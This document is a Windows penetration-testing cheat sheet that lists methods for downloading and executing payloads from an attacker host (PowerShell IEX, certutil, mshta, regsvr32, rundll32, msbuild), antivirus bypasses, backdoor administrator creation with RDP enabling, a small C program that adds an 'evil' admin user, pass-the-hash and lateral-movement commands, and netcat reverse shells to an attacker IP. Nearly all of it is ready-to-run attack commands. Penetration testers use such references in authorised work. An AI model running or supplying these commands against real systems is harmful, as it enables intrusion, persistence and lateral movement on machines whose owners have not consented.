
# Download and execute methods
## Downloaded files location 
```
C:\\Users\\username\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\
C:\\Users\\username\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\subdir
C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV\
```
## Default writeable folders
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```
## HTTP
### Cmd
#### Running a script from remote host
```
cmd.exe /k < \\webdavserver\folder\batchfile.txt
```
### Powershell
Default powershell locations:
```
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
#### Downloading files

In PowerShell 2.x:
```
powershell -Command '$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile("http://10.0.0.1/path/to/file","C:\path\to\file")'
```  
Can also be dumped into a script:
```
echo $webclient = New-Object System.Net.WebClient > wget.ps1
echo $url = "http://10.0.0.1:4444/file.exe" >> wget.ps1
echo $output = "C:\Windows\Temp\file.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$output) >> wget.ps1
powershell wget.ps1
```
In PowerShell 3 and above:
```
powershell -Command 'Invoke-WebRequest -Uri "http://10.0.0.1/path/to/file" -OutFile "C:\path\to\file"'
```
```
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
```
#### Running a Powershell script from remote host (Bypass AV)
Voir [Cheatsheet]( https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/powershell.rst#running-a-powershell-script-from-command-line ).
```
powershell IEX(New-Object Net.Webclient).downloadstring('http://<attacker-ip>:<attacker-port>/script.ps1')
```    
```
powershell -noexit -file "C:\path\to\script.ps1"
```    
To bypass execution policy:
```
powershell -executionPolicy bypass -noexit -file "C:\path\to\script.ps1"
```
To run with arguments:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```
To execute a specific method from an assembly:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
### CertUtil
#### Downloading files
```
certutil.exe -urlcache -split -f http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe
```
#### Running a script from remote host
Payload.dll:
```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Payload.exe:
```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
### BITSAdmin
#### Downloading files
```
bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe
```
#### Running a script from remote host
```
bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```
### VBS Script
#### Downloading files
```
echo strFileURL = "http://10.0.0.1:4444/file.exe" >> downloadfile.vbs
echo strHDLocation = "C:\Windows\Temp\file.exe" >> downloadfile.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> downloadfile.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> downloadfile.vbs
echo objXMLHTTP.send() >> downloadfile.vbs
echo If objXMLHTTP.Status = 200 Then >> downloadfile.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> downloadfile.vbs
echo objADOStream.Open >> downloadfile.vbs
echo objADOStream.Type = 1 'adTypeBinary >> downloadfile.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> downloadfile.vbs
echo objADOStream.Position = 0 >> downloadfile.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> downloadfile.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> downloadfile.vbs
echo Set objFSO = Nothing >> downloadfile.vbs
echo objADOStream.SaveToFile strHDLocation >> downloadfile.vbs
echo objADOStream.Close >> downloadfile.vbs
echo Set objADOStream = Nothing >> downloadfile.vbs
echo End if >> downloadfile.vbs
echo Set objXMLHTTP = Nothing >> downloadfile.vbs
cscript downloadfile.vbs
```
#### Running a script from remote host
```
cscript //E:jscript \\webdavserver\folder\payload.txt
```
### Mshta
#### Running a script from remote host
```
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
```
mshta http://webserver/payload.hta
```
```
mshta \\webdavserver\folder\payload.hta
```
### Rundll32
#### Running a script from remote host
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
```
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
### Regasm / Regsvc
#### Running a script from remote host
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
### Regsvr32
#### Running a script from remote host
```
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
### Odbconf
#### Running a script from remote host
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
### Msbuild
#### Running a script from remote host
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
## SMB
### Enable SMBv1 (client)

```
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
```
```
Set-ItemProperty -Path   "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" SMB1 -Type DWORD -Value   1 -Force
```
### Enable SMBv2/3 (client)
```
Enable-WindowsOptionalFeature -Online -FeatureName "SMB2Protocol-Client" -All
```
```
Set-ItemProperty -Path   "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" SMB2 -Type DWORD -Value   1 -Force
```
### Enable insecure guest authentication (client)
```
Set-itemproperty -name AllowInsecureGuestAuth -path "HKLM:\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters" -value "1"
```
```
reg add "HKLM:\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\AllowInsecureGuestAuth" /v Restrict_Run /t REG_DWORD /d 1 /f
```
### Downloading files

```
copy \\10.0.0.1\kali\file.exe C:\Windows\Temp\file.exe
```
### Uploading files

```
copy C:\Windows\Temp\file.exe \\10.0.0.1\kali\file.exe
```
## Netcat
### Downloading files
On Kali run :
```
nc -nvlp 4444 < /path/to/file.exe
```
On Windosw run:
```
nc.exe -nv 10.0.0.1 4444 > file.exe
```
### Uploading files
On Kali run:
```
nc -nvlp 4444 > /path/to/file.exe
```
On Windows run:
```
nc.exe -nv 10.0.0.1 4444 < file.exe
```
## FTP
### Downloading files
Create a text file with the commands you wish to use:
```
echo open 192.168.1.78 > ftp.txt
echo binary >> ftp.txt
echo get test.txt >> ftp.txt
echo bye >> ftp.txt
```
Then execute the commands in the file with the following command:
```
ftp -A -s:ftp.txt
```
### Uploading files
Create a text file with the commands you wish to use:
```
echo open 192.168.1.78 > ftp.txt
echo binary >> ftp.txt
echo put test.txt >> ftp.txt
echo bye >> ftp.txt
```
Then execute the commands in the file with the following command:
```
ftp -A -s:ftp.txt
```
### TFTP
### Downloading files
```
tftp -i 10.0.0.1 GET file.exe
```
### Uploading files
```
tftp -i 10.0.0.1 PUT file.exe
```
# Generate Malicious Executables
## Malicious cmd
### Run executable in backgroud
```
start /B program
```
### Add Admin & Enable RDP
```
net user /add hacked Password1
net localgroup administrators hacked /add
net localgroup Administrateurs hacked /add (For French target)
net localgroup "Remote Desktop Users" hacked /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
```
## Exe builder
### MsfVenom
#### Add admin
\*Note: On x64 machine you should use bat2exe.bat to create 64 bit executable\*
```
1\. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o exploit.exe
2\. Copy the generated file, exploit.exe, to the Windows VM.
```
### GCC
Write and compile malicious exe file to add a user to the system as an admin
#### Add admin
##### Contents of adduser.c
```
#include <stdlib.h>

int main ()
{

	int i;

	i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");

		return 0;
}
```

##### Compile adduser.c on kali
```
sudo i686-w64-mingw32-gcc adduser.c -o exploit.exe
```
# Using credentials 

## Winxe
```
winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
```
## WinRM
Using public ruby script:
```
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
ruby evil-winrm.rb -i 10.0.0.20 -u username -H BD1C6503987F8FF006296118F359FA79
ruby evil-winrm.rb -i 10.0.0.20 -u username -p password -r domain.local
```
or using a custom ruby code to interact with the WinRM service:
```
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://ip:5985/wsman',
  user: 'domain/user',
  password: 'password',
)

command=""
conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```
### Download file (Bypass AV)
```
*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```
## Crackmapexec
```
cme smb 1.1.1.1 -u Administrator -H ":5858d47a41e40b40f294b" -x 'whoami' # cmd
cme smb 0.0.0.0 -u Administrator -H ":5858d47a41e40b40f294b" -X 'whoami' # powershell
cme smb 1.1.1.1 -u Administrator -H ":5858d47a41e40b40f294b" --exec-method atexec -x 'whoami'
cme smb 1.1.1.1 -u Administrator -H ":5858d47a41e40b40f294b" --exec-method wmiexec -x 'whoami'
cme smb 1.1.1.1 -u Administrator -H ":5858d47a41e40b40f294b" --exec-method smbexec -x 'whoami'
```
## Impacket
```
# PSEXEC like functionality example using RemComSv (noisy)
python psexec.py DOMAIN/username:password@10.10.10.10

# A similar approach to PSEXEC w/o using RemComSvc
python smbexec.py DOMAIN/username:password@10.10.10.10

# A semi-interactive shell, used through Windows Management Instrumentation. 
python wmiexec.py DOMAIN/username:password@10.10.10.10
python wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

# A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
python atexec.py DOMAIN/username:password@10.10.10.10

# Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
python dcomexec.py DOMAIN/username:password@10.10.10.10
```
## RDP
Enable Rdp on the server:
```
# Enable RDP
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
# Alternative
psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0

# Fix CredSSP errors
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Disable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
(Get-WmiObject -class "**Win32_TSGeneralSetting**" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```
Connect from kali:
```
# Using cme
crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable

# Using rdesktop (sharing a local folder during a remote desktop session with -r)
rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare

# Using freerdp
xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing
# Pth need an admin account not in the "Remote Desktop Users" group (works for Server 2012 R2 / Win 8.1+ and require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11)
xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d 

# Sharprdp
SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
```
## PsExec (Sysinternal)
```
# Connect to remote system
PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
# switch admin user to NT Authority/System on the remote system 
PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
# switch from local administrato to NT SYSTEM locally
PsExec.exe -i -s cmd.exe
```
## Runas
 ```
runas /netonly /user:DOMAIN\username "cmd.exe"
runas /noprofil /netonly /user:DOMAIN\username cmd.exe
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"

C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```
## Powershell
Remote code execution with PS Credentials:
```
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```
Powershell remoting:
```
#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting
#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -NAME <NameOfSession> -ComputerName <NameOfComputer>
Enter-PSSession -Sessions <NameOfSession> or -ComputerName <NameOfComputer>
[DC01]: PS>
```
Remote stateful commands:
```
# Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>
# Execute command
Invoke-Command -ComputerName <NameOfComputer> -ScriptBlock {whoami}
# Execute script
Invoke-Command -computername <NameOfComputer> -filePath c:\Scripts\Task.ps1
```
If problems occurs specify the session:
```
# Execute command on the session and stock the result
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
# Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```
Donwnload and execute exploit remotely in one line:
```
Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\Temp\beacon.exe'; Start-Process -wait C:\Temp\beacon.exe}
```
## WMI
```
wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
```
## Netuse
```
net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
```
# Ressources

[Pentest-Cheatsheets/file-transfers.rst at master · Tib3rius/Pentest-Cheatsheets (github.com)](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/file-transfers.rst)
[Pentest-Cheatsheets/useful-commands.rst at master · Tib3rius/Pentest-Cheatsheets (github.com)](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/useful-commands.rst)
[Pentest-Cheatsheets/powershell.rst at master · Tib3rius/Pentest-Cheatsheets (github.com)](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/powershell.rst)
[PayloadsAllTheThings/Windows - Using credentials.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md)
[Tib3rius/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory. (github.com)](https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet#lateral-movement)

[PayloadsAllTheThings/Windows - Download and Execute.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)